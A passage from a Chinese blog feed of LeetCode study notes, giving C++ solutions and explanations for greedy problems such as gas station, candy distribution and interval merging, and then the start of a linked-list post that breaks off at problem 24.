<h4 id="134-加油站"><a href="#134-加油站" class="headerlink" title="134. 加油站"></a><a href="https://leetcode.cn/problems/gas-station/">134. 加油站</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107585.png" alt="image-20241001110742483"></p>
<p>放个<a href="https://www.bilibili.com/video/BV1jA411r7WX/?spm_id_from=333.788&vd_source=4ff685bfd09521f9771101de2b6d7a5b">视频</a>在这里,忘了的话就再看看</p>
<h5 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h5><p>轮流让每一个点当出发点,用while循环和取余操作模拟转圈最后看能否回到出发点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">canCompleteCircuit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; gas, vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = gas.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> remain = gas[i] - cost[i];<span class="comment">//从某一个点出发到下一个点剩的油量</span></span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//绕一圈的过程中总的油量变化</span></span><br><span class="line">            <span class="keyword">if</span> (remain &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> cur = (i + <span class="number">1</span>) % n;</span><br><span class="line">                sum += remain;</span><br><span class="line">                <span class="keyword">while</span> (cur != i &amp;&amp; sum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    remain = gas[cur] - cost[cur];</span><br><span class="line">                    sum += remain;</span><br><span class="line">                    cur = (cur + <span class="number">1</span>) % n;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cur == i &amp;&amp; sum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="贪心策略"><a href="#贪心策略" class="headerlink" title="贪心策略"></a>贪心策略</h5><p>这题因为是一个环,所以有个最根本的关系,就是如果每一站的remain相加只要是一个正数,那么从某一个点出发一定能跑完一圈</p>
<p>通过循环随时记录curSum,如果curSum为负数了,那么就从下一个点出发</p>
<p>当start = i+1, 且这个start没有被后序的更新替代，则说明从start到数组结束位置(gas.size()-1)之间的sum为正数，若记该sum为B，start之前的sum为A，那么A+B=totalSum, 已知totalSum&gt;=0, A&lt;0, B&gt;0, 所以B&gt;-A, 走完一圈的B+A&gt;=0</p>
<p>**思考一个逻辑:**start能走到<code>i</code>这里,说明<code>i</code>前面的都不行,这是一种递推的关系</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">canCompleteCircuit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; gas, vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> totalSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; gas.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            totalSum += gas[i] - cost[i];</span><br><span class="line">            curSum += gas[i] - cost[i];</span><br><span class="line">            <span class="keyword">if</span> (curSum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                start = i + <span class="number">1</span>;</span><br><span class="line">                curSum = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (totalSum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="135-分发糖果"><a href="#135-分发糖果" class="headerlink" title="135. 分发糖果"></a><a href="https://leetcode.cn/problems/candy/">135. 分发糖果</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107385.png" alt="image-20241001110753287"></p>
<p>对于这种中间要比两边大的情况,尽量两边各自处理</p>
<p>由于递推关系,从前往后遍历的时候,判断后面是不是比前面大(也就是判断未知的是不是比已知的大)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; ratings)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">get</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &gt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                get[i] = get[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[j] &gt; ratings[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                get[j] = <span class="built_in">max</span>(get[j], get[j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    		<span class="comment">//这里为什么不是get[j + 1] + 1</span></span><br><span class="line">                <span class="comment">//因为前面处理右边比左边大的情况的时候有可能前一个比后一个大,不能直接去后面的+1,要取最大值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res += get[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="860-柠檬水找零"><a href="#860-柠檬水找零" class="headerlink" title="860. 柠檬水找零"></a><a href="https://leetcode.cn/problems/lemonade-change/">860. 柠檬水找零</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108702.png" alt="image-20241001110802606"></p>
<p>这题的贪心策略是,5块钱是万能的,所以找零的时候优先用十块钱,再用5块钱</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">lemonadeChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; bills)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> five = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ten = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bills.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bills[i] == <span class="number">5</span>) &#123;</span><br><span class="line">                five++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bills[i] == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (five &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    five--;</span><br><span class="line">                    ten++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bills[i] == <span class="number">20</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ten &gt; <span class="number">0</span> &amp;&amp; five &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ten--;</span><br><span class="line">                    five--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//10没了只能用5</span></span><br><span class="line">                    five -= <span class="number">3</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (five &lt; <span class="number">0</span> || ten &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="406-根据身高重建队列"><a href="#406-根据身高重建队列" class="headerlink" title="406. 根据身高重建队列"></a><a href="https://leetcode.cn/problems/queue-reconstruction-by-height/">406. 根据身高重建队列</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108064.png" alt="image-20241001110812964"></p>
<p>按照身高降序排序(如果身高相同,k小的排前面)之后,再按照k插入调整序列,现在排完序就说明每个元素前面的都是大于等于它的,所以要前面有几个大于等于它的,就把他插入到k的位置</p>
<p>思考:为什么排序的时候要在身高相同的情况下让k小的放前面,因为如果k大的在前面在插入的时候会报错,因为对应的位置还没有被分配内存(也就是往长度为1的vector中向第2个位置插入元素,肯定是不对的)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; a, vector&lt;<span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a[<span class="number">0</span>] != b[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">0</span>] &gt; b[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">reconstructQueue</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; people) &#123;</span><br><span class="line">        <span class="comment">//people = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]</span></span><br><span class="line">        <span class="built_in">sort</span>(people.<span class="built_in">begin</span>(), people.<span class="built_in">end</span>(), cmp);</span><br><span class="line">        <span class="comment">//people = [7,0][7,1][6,1][5,2][5,0][4,4]</span></span><br><span class="line">        <span class="comment">// 按照身高降序排序(如果身高相同,k小的排前面)之后,再按照k插入调整序列,现在排完序就说明每个元素前面的都是大于等于它的,所以要前面有几个大于等于它的,就把他插入到k的位置</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; people.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> position = people[i][<span class="number">1</span>];</span><br><span class="line">            res.<span class="built_in">insert</span>(res.<span class="built_in">begin</span>() + position, people[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="452-用最少数量的箭引爆气球"><a href="#452-用最少数量的箭引爆气球" class="headerlink" title="452. 用最少数量的箭引爆气球"></a><a href="https://leetcode.cn/problems/minimum-number-of-arrows-to-burst-balloons/">452. 用最少数量的箭引爆气球</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108054.png" alt="image-20241001110822955"></p>
<p>本题本质上是区间交集问题</p>
<p>先按照左区间进行排序,然后将第一个区间插入temp中</p>
<p>接着从第二个区间开始,依次判断左区间是不是比temp 中最后一个右区间小,如果小,则说明有交集,那么把它和temp中最后一个区间取交集后再放入</p>
<p>如果没有交集,则往temp中<code>push_back</code>当前区间,最后答案就是取完交集后在temp中的区间数量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; a, vector&lt;<span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123; <span class="keyword">return</span> a[<span class="number">0</span>] &lt; b[<span class="number">0</span>]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMinArrowShots</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先按照左区间进行排序</span></span><br><span class="line">        <span class="built_in">sort</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">end</span>(), cmp);</span><br><span class="line">        <span class="comment">// 把有交集的区间取交集</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; temp;</span><br><span class="line">        temp.<span class="built_in">push_back</span>(points[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; points.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (points[i][<span class="number">0</span>] &lt;= temp[j][<span class="number">1</span>]) &#123;</span><br><span class="line">                temp[j][<span class="number">0</span>] = <span class="built_in">max</span>(points[i][<span class="number">0</span>], temp[j][<span class="number">0</span>]);</span><br><span class="line">                temp[j][<span class="number">1</span>] = <span class="built_in">min</span>(points[i][<span class="number">1</span>], temp[j][<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(points[i]);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="435-无重叠区间"><a href="#435-无重叠区间" class="headerlink" title="435. 无重叠区间"></a><a href="https://leetcode.cn/problems/non-overlapping-intervals/">435. 无重叠区间</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108173.png" alt="image-20241001110834074"></p>
<p>本题和上一题一样,只要是判断区间,先按照左区间进行排序,然后如果后一个区间和前一个区间有交集,那么根据贪心策略,删除右区间大的那一个,对后面有交集的影响最小</p>
<p>因为判断是否有交集是后一个的左区间小于前一个的右区间</p>
<p>所以这里的删除可以用取两个右区间的最小值做代替</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; a, vector&lt;<span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123; <span class="keyword">return</span> a[<span class="number">0</span>] &lt; b[<span class="number">0</span>]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">eraseOverlapIntervals</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先按照左区间进行排序</span></span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), cmp);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; intervals.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i - <span class="number">1</span>][<span class="number">1</span>] &gt; intervals[i][<span class="number">0</span>]) &#123;</span><br><span class="line">                intervals[i][<span class="number">1</span>] = <span class="built_in">min</span>(intervals[i - <span class="number">1</span>][<span class="number">1</span>], intervals[i][<span class="number">1</span>]);</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="763-划分字母区间"><a href="#763-划分字母区间" class="headerlink" title="763. 划分字母区间"></a><a href="https://leetcode.cn/problems/partition-labels/">763. 划分字母区间</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108140.png" alt="image-20241001110843041"></p>
<p>本题实质上是求最小的能包含<code>有连续交集的区间</code>的区间</p>
<p>所以只需要维护每一个字母最后出现的位置,也就是右区间</p>
<p>遍历字符串过程中,遍历每个字母的右区间范围,如果出现更大的右区间,则更新这个覆盖范围,直到走完最后更新的覆盖范围,这个时候这些种类的字母就可以合成一个区间了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> range[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            range[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cover = range[s[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= cover) &#123;</span><br><span class="line">                cover = <span class="built_in">max</span>(cover, range[s[i] - <span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(i - start);</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a><a href="https://leetcode.cn/problems/merge-intervals/">56. 合并区间</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011108051.png" alt="image-20241001110851957"></p>
<p>本题只是在<a href="https://leetcode.cn/problems/minimum-number-of-arrows-to-burst-balloons/">452. 用最少数量的箭引爆气球</a>的基础上在有重叠区间的时候的操作从取交集变成并集就行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; a, vector&lt;<span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123; <span class="keyword">return</span> a[<span class="number">0</span>] &lt; b[<span class="number">0</span>]; &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), cmp);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        res.<span class="built_in">push_back</span>(intervals[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; intervals.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &lt;= res[j][<span class="number">1</span>]) &#123;</span><br><span class="line">                res[j][<span class="number">0</span>] = <span class="built_in">min</span>(intervals[i][<span class="number">0</span>], res[j][<span class="number">0</span>]);</span><br><span class="line">                res[j][<span class="number">1</span>] = <span class="built_in">max</span>(intervals[i][<span class="number">1</span>], res[j][<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(intervals[i]);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="738-单调递增的数字"><a href="#738-单调递增的数字" class="headerlink" title="738. 单调递增的数字"></a><a href="https://leetcode.cn/problems/monotone-increasing-digits/">738. 单调递增的数字</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011109800.png" alt="image-20241001110902707"></p>
<p>本题注意点:</p>
<ol>
<li>遍历顺序,从后往前变量,每次用新遍历的比较已经遍历过的部分</li>
<li>本质上是找到最高一位不符合要求的数字,它-1,然后后面的数字都变成9即可</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">monotoneIncreasingDigits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        string temp = <span class="built_in">to_string</span>(n);</span><br><span class="line">        <span class="keyword">int</span> flag = temp.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = temp.<span class="built_in">size</span>() - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] &gt; temp[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp[i]--;</span><br><span class="line">                flag = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = flag; i &lt; temp.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            temp[i] = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">stoi</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>leetcode</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>链表</title>
    <url>/2024/09/28/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h4 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2. 两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011129766.png" alt="image-20241001112946699"></p>
<p>同时遍历两个链表，将计算结果放入到带头结点的链表中，对于这种插入操作，尽量还是使用带头结点的链表</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        ListNode* res = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>); <span class="comment">// 结果带头结点</span></span><br><span class="line">        ListNode* cur = res;</span><br><span class="line">        <span class="keyword">while</span> (l1 &amp;&amp; l2) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = l1-&gt;val + l2-&gt;val + carry;</span><br><span class="line">            carry = temp / <span class="number">10</span>;</span><br><span class="line">            temp = temp % <span class="number">10</span>;</span><br><span class="line">            ListNode* s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(temp, <span class="literal">NULL</span>);</span><br><span class="line">            cur-&gt;next = s;</span><br><span class="line">            cur = s;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l1) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = l1-&gt;val + carry;</span><br><span class="line">            carry = temp / <span class="number">10</span>;</span><br><span class="line">            temp = temp % <span class="number">10</span>;</span><br><span class="line">            ListNode* s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(temp, <span class="literal">NULL</span>);</span><br><span class="line">            cur-&gt;next = s;</span><br><span class="line">            cur = s;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l2) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = l2-&gt;val + carry;</span><br><span class="line">            carry = temp / <span class="number">10</span>;</span><br><span class="line">            temp = temp % <span class="number">10</span>;</span><br><span class="line">            ListNode* s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(temp, <span class="literal">NULL</span>);</span><br><span class="line">            cur-&gt;next = s;</span><br><span class="line">            cur = s;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (carry) &#123;</span><br><span class="line">            ListNode* s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry, <span class="literal">NULL</span>);</span><br><span class="line">            cur-&gt;next = s;</span><br><span class="line">            cur = s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res-&gt;next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011129759.png" alt="image-20241001112958703"></p>
<p>思路：采用双指针pre和cur遍历链表进行反转操作，<code>pre</code>每次操作完都会指向已经被反转的链表部分的头结点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        ListNode* temp = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">            temp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;<span class="comment">//最后pre指向的就是被反转后的链表的头结点</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24. 两两交换链表中的节点"></a><a href="https://leetcode.cn/problems/swap-nodes-in-pairs/">24. 两两交换链表中的节点</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011130671.png" alt="image-20241001113009603"></p>
<p>思路：要两两交换节点需要找到他们之前的一个结点，于是创建一个虚拟头结点dummyHead</p>
